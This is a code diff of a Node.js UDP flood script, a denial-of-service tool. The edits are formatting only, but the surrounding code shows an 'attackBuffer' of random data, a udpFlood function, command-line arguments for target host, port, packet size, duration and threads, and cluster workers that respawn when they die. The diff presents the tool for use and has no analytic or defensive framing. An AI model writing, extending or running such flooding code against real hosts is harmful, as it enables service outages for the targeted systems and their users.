@@ -9,11 +9,10 @@ function randStr(size) {
     let buffer = [];
     for (let b = 0; b < size; b++) {
       buffer[b] = String.fromCharCode(Math.floor(Math.random() * 26) + 65);
-    }
-    return buffer.join('');
+    } return buffer.join('');
 }
 
-// generate the random alphanum string to send. (once per thread, more resource effective.)
+// generate the random alphanum string to send.
 const attackBuffer = randStr(parseInt(process.argv[4]));
 
 function udpFlood(host, port, length) {
@@ -28,8 +27,7 @@ if (cluster.isPrimary) {
     if (process.argv.length < 6) {
         console.log(`Usage: node ${process.argv[1]} [host] [port, (0 for random)] [size, (0 for random)] [time] [extra-threads]`);
         process.exit(1);
-    }
-    else {
+    } else {
         console.log(`Host: ${process.argv[2]}\nPort: ${process.argv[3] == 0 ? "random" : process.argv[3]}\nSize: ${process.argv[4] == 0 ? "random" : process.argv[4]}\nTime: ${process.argv[5]}\nThreads: ${process.argv[6]}`);
     }
 
@@ -38,6 +36,7 @@ if (cluster.isPrimary) {
         worker.setMaxListeners(0);
         worker.send({ message: "start" });
     }
+
     cluster.on('exit', (worker, code, signal) => {
         console.log(`Worker ${worker.process.pid} died with code ${code} and signal ${signal}`);
         const newWorker = cluster.fork();
